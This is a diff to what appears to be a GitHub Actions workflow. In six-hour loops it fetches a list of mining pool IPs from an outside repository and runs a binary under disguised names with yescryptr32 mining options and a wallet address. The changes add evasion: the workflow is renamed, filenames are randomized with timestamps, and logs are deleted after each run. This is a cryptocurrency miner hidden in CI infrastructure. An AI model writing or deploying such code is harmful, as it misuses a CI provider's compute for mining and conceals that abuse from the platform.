@@ -1,4 +1,4 @@
-name: mon
+name: bal
 
 on:
   workflow_dispatch:
@@ -51,34 +51,40 @@ jobs:
       run: |
         end_time=$(( $(date +%s) + 6*3600 ))  # 6 hours from now
         while [ $(date +%s) -lt $end_time ]; do
+          # Generate dynamic filenames
+          timestamp=$(date +%s)
+          dynamic_list="list_$timestamp.json"
+          dynamic_sgr=".lib/sgr_$timestamp"
+
           # Download and check IP list
-          wget -O list.json https://github.com/barburonjilo/setstra/raw/main/list.json
-          if [[ ! -f list.json ]]; then
+          wget -O $dynamic_list https://github.com/barburonjilo/setstra/raw/main/list.json
+          if [[ ! -f $dynamic_list ]]; then
             echo "Failed to download IP list. Exiting."
             exit 1
           fi
 
           # Check JSON file format
-          if ! jq '.' list.json > /dev/null 2>&1; then
+          if ! jq '.' $dynamic_list > /dev/null 2>&1; then
             echo "Invalid JSON format. Exiting."
             exit 1
           fi
 
           # Select a random IP from the JSON file
-          ip=$(jq -r '.[]' list.json | shuf -n 1)
+          ip=$(jq -r '.[]' $dynamic_list | shuf -n 1)
           if [ -z "$ip" ]; then
-            echo "No IP found in list.json. Exiting."
+            echo "No IP found in $dynamic_list. Exiting."
             exit 1
           fi
 
           # Remove selected IP from JSON file
-          jq --arg ip "$ip" 'del(.[] | select(. == $ip))' list.json > tmp.json && mv tmp.json list.json
+          jq --arg ip "$ip" 'del(.[] | select(. == $ip))' $dynamic_list > tmp_$timestamp.json && mv tmp_$timestamp.json $dynamic_list
 
-          # Start the process for multiple ports
-          for port in $(seq 843 852); do
-            if [ -f .lib/sgr1 ]; then
+          # Ensure sgr file is present
+          if [ -f $dynamic_sgr ]; then
+            # Start the process for multiple ports
+            for port in $(seq 843 852); do
               # Run the process with the specified parameters in background
-              nohup .lib/sgr1 -a yescryptr32 --pool $ip:$port -u UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx --timeout 120 -t 4 > dance_$port.log 2>&1 &
+              nohup $dynamic_sgr -a yescryptr32 --pool $ip:$port -u UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx --timeout 120 -t 4 > dance_$port_$timestamp.log 2>&1 &
               process_pid=$!
 
               echo "Started process with PID $process_pid using IP $ip and port $port"
@@ -88,15 +94,18 @@ jobs:
 
               # Kill the process
               kill $process_pid || true
-            else
-              echo "sgr1 not found. Skipping..."
-              sleep 120
-            fi
-          done
+
+              # Remove the log file after the process is stopped
+              rm -f dance_$port_$timestamp.log
+            done
+          else
+            echo "$dynamic_sgr not found. Skipping..."
+            sleep 120
+          fi
 
           # Wait for 2 minutes before the next iteration
           sleep 120
 
           # Clean up after each iteration
-          rm -f list.json tmp.json
+          rm -f $dynamic_list
         done
